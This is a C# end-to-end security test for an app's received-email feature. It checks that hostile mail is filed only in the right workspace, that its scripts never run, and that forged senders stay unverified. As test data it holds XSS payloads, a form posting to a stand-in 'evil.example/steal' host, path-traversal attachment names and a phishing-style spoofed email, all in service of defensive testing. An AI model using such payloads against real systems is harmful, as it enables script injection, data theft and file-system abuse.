// =====================================================================
// FILE: tests/MerkaiTrial.E2E/Tests/ReceivedEmailTests.cs
//
// VUL-25 (round 106) — received email is shown safely and filed only
// where it belongs.
//
//   Received_email_is_filed_in_its_own_workspace_and_shown_as_text
//
// Received email is the one thing in the app whose every word is written
// by a stranger. Sent to workspace A's receiving address through the real
// webhook and the real processing (the test servers read the body from a
// folder instead of Resend — run-e2e.ps1, agreed in 106):
//
//   HOSTILE CONTENT (from a lead of A's, sender checks passing)
//   • filed on that lead, in workspace A;
//   • of three attachments only the real PDF is kept — under its plain
//     name, in A's own folder, even though it was sent as
//     "..\..\..\web.config.pdf" — while a web page and a web page
//     pretending to be a .png are not;
//   • its subject, a <script>, is shown AS TEXT, on the email's page, in the
//     inbox and on the lead; its body is shown in a sandbox where no script
//     runs (no allow-scripts, no allow-same-origin) and pictures from other
//     sites are off; nothing the email carries runs anywhere (window.__x).
//   ANOTHER WORKSPACE'S CUSTOMER
//   • an email from an address that is a lead in workspace B, sent to A,
//     is A's alone: not linked to B's lead, not in B's inbox, not openable
//     by B.
//   A FORGED SENDER
//   • an email claiming to be from A's lead but failing its sender checks
//     (DMARC) is NOT filed on the lead: it waits, marked unverified.
//   NOBODY'S ADDRESS
//   • an email to an address no workspace uses is dropped, filed nowhere.
// =====================================================================

using System.Text.Json;
using MerkaiTrial.E2E.Infrastructure;

namespace MerkaiTrial.E2E.Tests;

[TestFixture, Category("Security")]
public class ReceivedEmailTests : E2ETest
{
    private static readonly TimeSpan Wait = TimeSpan.FromSeconds(90);

    [Test]
    public async Task Received_email_is_filed_in_its_own_workspace_and_shown_as_text()
    {
        var a = World.A;
        var b = World.B;
        var tenantA = await Db.TenantIdAsync(a.Name);
        var tenantB = await Db.TenantIdAsync(b.Name);
        var apiA = await Api.AsAsync(a.Admin);
        var apiB = await Api.AsAsync(b.Admin);
        var m = Random.Shared.Next(10000, 99999).ToString();
        var problems = new List<string>();

        var address = await Step("Workspace A's receiving address on the test domain", async () =>
        {
            var r = await apiA.GetAsync("/api/inbound-emails/settings");
            Assert.That(r.IsSuccess, Is.True, $"Reading A's email settings failed: {r}");
            var j = r.Json();
            var alias = Str(j, "alias");
            var domain = Str(j, "domain");
            if (!string.Equals(domain, ReceivedMail.Domain, StringComparison.OrdinalIgnoreCase))
                Assert.Fail($"The test WebApi's receiving domain is '{domain ?? "(none)"}', not {ReceivedMail.Domain}. " +
                            "Start the servers through run-e2e.ps1.");
            Assert.That(alias, Is.Not.Null.And.Not.Empty, "Workspace A has no receiving address.");
            return $"{alias}@{ReceivedMail.Domain}";
        });

        var leadEmailA = World.EmailFor("A", "rcva" + m);
        var leadEmailB = World.EmailFor("B", "rcvb" + m);
        var leadA = await Step("A lead of A's and a lead of B's, each with their own email address", async () =>
        {
            var la = await apiA.PostAsync("/api/leads", new
            {
                tenantId = tenantA, fullName = "Rcv Lead A " + m, email = leadEmailA, phone = "+919815" + m,
                companyName = "Rcv A Co", estimatedValue = 1000m, currency = "INR",
            });
            Assert.That(la.IsSuccess, Is.True, $"Adding A's lead failed: {la}");
            var lb = await apiB.PostAsync("/api/leads", new
            {
                tenantId = tenantB, fullName = "Rcv Lead B " + m, email = leadEmailB, phone = "+919816" + m,
                companyName = "Rcv B Co", estimatedValue = 1000m, currency = "INR",
            });
            Assert.That(lb.IsSuccess, Is.True, $"Adding B's lead failed: {lb}");
            return ApiIds.IdOf(la);
        });

        var hostileSubject = $"<script>window.__x=1</script> Pricing question {m}";
        var hostile = await Step("A hostile email from A's lead: script subject and body, three attachments", async () =>
        {
            var html =
                "<p>Hello</p><script>window.__x=1</script>" +
                "<img src=x onerror=\"window.__x=2\">" +
                "<a href=\"javascript:window.__x=3\">click</a>" +
                "<iframe src=\"javascript:window.__x=4\"></iframe>" +
                "<form action=\"https://evil.example/steal\"><input name=p><button>Go</button></form>" +
                "<img src=\"https://tracker.evil.example/pixel.gif\">" +
                "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">";
            var (id, answer) = await ReceivedMail.SendAsync(leadEmailA, "Rcv Customer", new[] { address }, hostileSubject, html,
                "Hello", ReceivedMail.Auth.Pass, new[]
                {
                    new ReceivedMail.File("../../evil.html", "text/html", System.Text.Encoding.UTF8.GetBytes("<script>window.__x=5</script>")),
                    new ReceivedMail.File(@"..\..\..\web.config.pdf", "application/pdf", Files.SmallPdf("Rcv " + m)),
                    new ReceivedMail.File("photo.png", "image/png", System.Text.Encoding.UTF8.GetBytes("<html><script>window.__x=6</script></html>")),
                });
            Assert.That(answer.IsSuccess, Is.True, $"The webhook refused the received email: {answer}");
            var row = await ReceivedMail.WaitAsync(Db, id, Wait)
                ?? throw new AssertionException("The received email was never filed.");
            Assert.That(row.ProcessingState, Is.EqualTo(2),
                $"The received email wasn't processed (state {row.ProcessingState}, {row.ProcessingError}). Is the WebApi from this run?");
            return row;
        });

        await Step("…filed on A's lead, in A; only the real PDF kept, under its plain name, in A's folder", async () =>
        {
            if (hostile.TenantId != tenantA) problems.Add("The email to A's address was filed in another workspace.");
            if (hostile.LeadId != leadA) problems.Add($"The email from A's lead wasn't filed on that lead (lead {hostile.LeadId?.ToString() ?? "none"}).");

            var files = await Db.InboundFilesAsync(hostile.Id);
            if (files.Count != 1) problems.Add($"{files.Count} attachments were kept (expected only the real PDF): {string.Join(", ", files.Select(f => f.FileName))}");
            foreach (var f in files)
            {
                if (f.FileName.IndexOfAny(new[] { '/', '\\' }) >= 0 || f.FileName.Contains("..", StringComparison.Ordinal))
                    problems.Add($"A kept attachment's name still carries a path: '{f.FileName}'.");
                if (!f.FileUrl.StartsWith($"/uploads/{tenantA:N}/", StringComparison.OrdinalIgnoreCase))
                    problems.Add($"A kept attachment was stored outside A's folder: '{f.FileUrl}'.");
                if (f.FileName.EndsWith(".html", StringComparison.OrdinalIgnoreCase) || f.MimeType is "text/html")
                    problems.Add("The web page attachment was KEPT.");
                if (f.FileName.EndsWith(".png", StringComparison.OrdinalIgnoreCase))
                    problems.Add("The web page pretending to be a .png was KEPT.");
            }
        });

        await Step("Its script subject shows as text and nothing it carries runs — email page, inbox, lead", async () =>
        {
            var page = await SignedInAsync(a.Admin);
            await page.EvaluateAsync("() => { window.__x = undefined; }");

            foreach (var path in new[] { $"/Emails/View/{hostile.Id}", "/Inbox", $"/Leads/Detail/{leadA}" })
            {
                await page.GotoAsync(path);
                await Ui.WaitForDocumentAsync(page);
                await page.WaitForTimeoutAsync(1500);

                var ran = await page.EvaluateAsync<string>("() => String(window.__x)");
                if (ran != "undefined") problems.Add($"On {path} something from the email RAN (window.__x = {ran}).");

                if (path.StartsWith("/Emails/View", StringComparison.Ordinal))
                {
                    var text = await page.Locator("body").InnerTextAsync();
                    if (!text.Contains("<script>window.__x=1</script>", StringComparison.Ordinal))
                        problems.Add("The email's page doesn't show its script subject as text (it may have been run or dropped).");

                    var sandbox = await page.EvaluateAsync<string>(
                        "() => { const f = document.querySelector('iframe'); return f ? (f.getAttribute('sandbox') ?? '(no sandbox)') : '(no frame)'; }");
                    if (sandbox == "(no frame)")
                        problems.Add("The email's body isn't in a frame of its own.");
                    else if (sandbox == "(no sandbox)" || sandbox.Contains("allow-scripts", StringComparison.OrdinalIgnoreCase)
                             || sandbox.Contains("allow-same-origin", StringComparison.OrdinalIgnoreCase))
                        problems.Add($"The email's body frame lets scripts run or reach the app (sandbox='{sandbox}').");

                    var policy = await page.EvaluateAsync<string>(
                        "() => { const f = document.querySelector('iframe'); return f ? (f.getAttribute('srcdoc') ?? '') : ''; }");
                    if (policy.Length > 0 && !policy.Contains("img-src data:;", StringComparison.Ordinal) && !policy.Contains("img-src data:\"", StringComparison.Ordinal))
                        problems.Add("Pictures from other sites are not off by default in the email's body.");
                }
            }
        });

        await Step("An email from B's lead's address, sent to A: A's alone — not on B's lead, not in B's inbox, not openable by B", async () =>
        {
            var subject = $"Cross workspace {m}";
            var (id, answer) = await ReceivedMail.SendAsync(leadEmailB, "B's Customer", new[] { address }, subject,
                "<p>Hi A</p>", "Hi A", ReceivedMail.Auth.Pass);
            Assert.That(answer.IsSuccess, Is.True, $"The webhook refused the email: {answer}");
            var row = await ReceivedMail.WaitAsync(Db, id, Wait) ?? throw new AssertionException("The email was never filed.");

            if (row.TenantId != tenantA) problems.Add("An email to A's address went to another workspace because the sender is B's lead.");
            if (row.LeadId is not null) problems.Add("An email from an address that is only B's lead was filed on a lead in A.");

            var list = await apiB.GetAsync("/api/inbound-emails");
            if (list.Body.Contains(subject, StringComparison.Ordinal)) problems.Add("Workspace B's inbox lists an email sent to A.");
            var open = await apiB.GetAsync($"/api/inbound-emails/{row.Id}");
            if (open.IsSuccess || open.Body.Contains(subject, StringComparison.Ordinal)) problems.Add($"Workspace B opened A's received email: {open}");
        });

        await Step("A forged sender (A's lead's address, failing DMARC) is NOT filed on the lead; it waits, unverified", async () =>
        {
            var (id, answer) = await ReceivedMail.SendAsync(leadEmailA, "Rcv Customer", new[] { address }, $"Forged {m}",
                "<p>Please pay into this new account</p>", "Please pay into this new account", ReceivedMail.Auth.Spoofed);
            Assert.That(answer.IsSuccess, Is.True, $"The webhook refused the email: {answer}");
            var row = await ReceivedMail.WaitAsync(Db, id, Wait) ?? throw new AssertionException("The email was never filed.");

            if (row.LeadId is not null) problems.Add("An email failing its sender checks was filed on the lead it claims to be from.");
            if (row.SenderVerified != false) problems.Add($"An email failing DMARC isn't marked unverified (SenderVerified = {row.SenderVerified?.ToString() ?? "unknown"}).");
            if (row.Status != 0) problems.Add($"An email failing its sender checks was given status {row.Status} (expected unmatched, waiting).");
        });

        await Step("An email to an address no workspace uses is dropped, filed nowhere", async () =>
        {
            var (id, answer) = await ReceivedMail.SendAsync(leadEmailA, "Rcv Customer", new[] { $"nobody{m}@{ReceivedMail.Domain}" },
                $"Nowhere {m}", "<p>?</p>", "?", ReceivedMail.Auth.Pass);
            if (answer.Status >= 500) problems.Add($"An email to nobody's address gave a server error: {answer}");
            await Task.Delay(2000);
            if (await Db.InboundAsync(id) is not null) problems.Add("An email to an address no workspace uses was filed somewhere.");
        });

        Assert.That(problems, Is.Empty, $"{problems.Count} problem(s):\n  • " + string.Join("\n  • ", problems));
    }

    private static string? Str(JsonElement e, string name) =>
        e.ValueKind == JsonValueKind.Object && e.TryGetProperty(name, out var v) && v.ValueKind == JsonValueKind.String ? v.GetString() : null;
}
